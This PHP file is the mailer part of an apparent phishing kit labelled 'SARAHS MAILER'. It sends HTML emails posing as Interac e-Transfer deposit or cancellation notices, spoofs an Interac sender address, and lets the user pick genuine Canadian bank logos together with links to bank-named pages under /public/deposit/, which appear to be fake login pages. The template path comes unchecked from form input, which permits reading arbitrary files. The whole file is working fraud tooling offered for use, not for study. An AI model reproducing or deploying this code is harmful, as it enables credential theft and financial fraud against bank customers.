<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require ("PHPMailer/src/PHPMailer.php");
require ("PHPMailer/src/SMTP.php");
require ("PHPMailer/src/Exception.php");

// Retrieve form data
$subject = $_POST['subject'];
$template_file = $_POST['template'];

$template = file_get_contents($template_file); 
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $template);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);

// Create PHPMailer object and set properties
$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tsl';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('<smtp@email.com>', $_POST['sender_name']);
$mail->AddAddress($_POST['receiver_email']);

// Set email subject from dropdown menu
$mail->Subject = $subject;

$mail->IsHTML(true);
$mail->CharSet="utf-8";

// Send email and display error message if it fails
if(!$mail->Send()) {
	echo "Mailer Error: " . $mail->ErrorInfo;
}

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>PHPMailer HTML Form</title>
</head>
<body>

<h1>SARAHS MAILER</h1>
	<form action="submit4.php" method="post">

	<input type="hidden" name="link" value="<?php echo $_SERVER['HTTP_HOST']; ?>" required>
	
	<label for="subject">Select Subject:</label>
	<select name="subject" id="subject">
		<option value="NULL">EMAIL : SUBJECT</option>
		<option value="INTERAC e-Transfer: <?php echo $_POST['sender_name'] ?>' sent you money.">Interac : Deposit</option>
		<option value="INTERAC e-Transfer: <?php echo $_POST['sender_name'] ?>' has Canceled the request.">Interac : Cancel</option>
		<option value="INTERAC e-Transfer: <?php echo $_POST['sender_name'] ?>' sent you money.">Interac : Request [n/a]</option>
	</select>
	
	<label for="template">Select Template:</label>
	<select name="template" id="template">
		<option value="NULL">EMAIL | TEMPLATE</option>
		<option value="/email_temp/interac/Deposit.html">Interac : deposit</option>
		<option value="/email_temp/interac/CancelNotice.html">Interac : Cancel </option>
		<option value="/email_temp/interac/request.html">Interac : Request [n/a]</option>
	</select>

		<br><br>	
	<label for="amount">ETRANSER | AMOUNT</label>
	<input type="text"   name="amount" Value="100.00" step="0.01"  required>
		<br><br>

		<label for="expiredate">Expire Date:</label>
        <input type="text"   name="expiredate" Value=", 2023" placeholder="May 8,2023" required>
		<br><br>

<label for="photo_link">BANK | LOGO</label>
<select name="template" id="photo_link">
<option value="NULL"> - SELECT A BANK - </option>   
<option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ATB Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">National Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000308.png">EQ Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario CU ghg</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000346.png">Motive Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000324.png">Alterna Savings</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000210.png">Bridgewater Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000311.png">Oaken Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000341.png">Zag Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000016.png">President's Choice Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000217.png">Servus CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000314.png">Westminster Savings </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000325.png">Christian CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000331.png">Vancity CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000332.png">Valley First CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000338.png">Mountain View Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000345.png">Connect First CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000071.png">ICICI Bank Canada</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000129.png">National Bank Direct </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000174.png">Caisse Financial Group</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000188.png">State Bank of India)</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000205.png">Bridgeway Nationa</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000212.png">AcceleRate Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000239.png">First Calgary Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000244.png">Tandia Financial Credit </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000254.png">DUCA CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000256.png">Envision Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000271.png">Interior Savings </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000279.png">Kindred CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000290.png">Northern CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000309.png">Steinbach CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000326.png">Synergy CU</option>
</select>


<label for="bank">BANK | NAME</label>
<select name="bank" id="bank">
<option value="NULL">- SELECT A BANK - </option>   
	<option value="Scotiabank">Scotia Bank</option>
	<option value="Bank of Montreal">Bank of Montreal</option>
	<option value="CIBC">CIBC</option>
	<option value="RBC Royal Bank">RBC Royal Bank</option>
	<option value="ATB Financial">ATB Financial</option>
	<option value="TD Canada Trust">TD Canada Trust</option>
	<option value="HSBC Bank Canada">HSBC Bank Canada</option>
	<option value="National Bank of Canada">National Bank of Canada</option>
	<option value="Desjardins">Desjardins</option>
	<option value="Laurentian Bank of Canada">Laurentian Bank of Canada</option>
	<option value="Manulife Bank of Canada">Manulife Bank of Canada</option>
	<option value="Tangerine Bank">Tangerine Bank</option>
	<option value="Alterna Bank">Alterna Bank</option>
	<option value="Bridgewater Bank">Bridgewater Bank</option>
	<option value="Canadian Tire Bank">Canadian Tire Bank</option>
	<option value="Equitable Bank">Equitable Bank</option>
	<option value="First Nations Bank of Canada">First Nations Bank of Canada</option>
	<option value="Haventree Bank">Haventree Bank</option>
	<option value="Motus">Motusbank</option>
	<option value="Peoples Trust Company">Peoples Trust Company</option>
	<option value="Simplii Financial">Simplii Financial</option>
	<option value="Vancity">Vancity</option>
</select>
<label for="bank">BANK | LINK</label>    
<select name="photo_href" id="photo_href">
<option value="NULL">- SELECT A BANK - </option>   
<option value="/public/deposit/sco/928460.php">Scotiabank</option>
<option value="/public/deposit/simplii/928460.php">Simplii Financial</option>
<option value="/public/deposit/bmo/928460.php">Bank of Montreal</option>
<option value="/public/deposit/cibc/928460.php">CIBC</option>
<option value="/public/deposit/rbc/928460.php">RBC Royal Bank</option>
<option value="/public/deposit/atb/928460.php">ATB Financial</option>
<option value="/public/deposit/td/928460.php">TD Canada Trust</option>
<option value="/public/deposit/hsbc/928460.php">HSBC Bank Canada</option>
<option value="/public/deposit/nbc/928460.php">National Bank of Canada</option>
<option value="/public/deposit/desj/928460.php">Desjardins</option>
<option value="/public/deposit/laur/928460.php">Laurentian Bank of Canada</option>
<option value="/public/deposit/manu/928460.php">Manulife Bank of Canada</option>
<option value="/public/deposit/tang/928460.php">Tangerine Bank</option>
<option value="/public/deposit/alterna/928460.php">Alterna Bank</option>
<option value="/public/deposit/bridgewater/928460.php">Bridgewater Bank</option>
<option value="/public/deposit/canadiantire/928460.php">Canadian Tire Bank</option>
<option value="/public/deposit/equitable/928460.php">Equitable Bank</option>
<option value="/public/deposit/firstnations/928460.php">First Nations Bank of Canada</option>
<option value="/public/deposit/haventree/928460.php">Haventree Bank</option>
<option value="/public/deposit/motus/928460.php">Motusbank</option>
<option value="/public/deposit/peoples-trust/928460.php">Peoples Trust Company</option>
<option value="/public/deposit/simplii/928460.php">Simplii Financial</option>
<option value="/public/deposit/vancity/928460.php">Vancity</option>
      </select>
         <br><br>
		<label for="sender_name">Sender Name:</label>
        <input type="text"   name="sender_name" value="TRIPLE X OILFIELD LTD" required>
		<input type="text"   name="recr_name" value="notify@interac.etransfer.ca" required>
        <br><br>
        <label for="receiver_name">Receiver name:</label>      
        <input type="text"   name="receiver_name" value="One-time Contact" required>
		<label for="receiver_name">Receiver email:</label>
        <input type="email"   id="search"  name="receiver_email" value="insertarealeamilhere@yopmail.com"  required>
		<br><br>
		<input type="submit" value="Send Email">

	</form>
</body>
</html>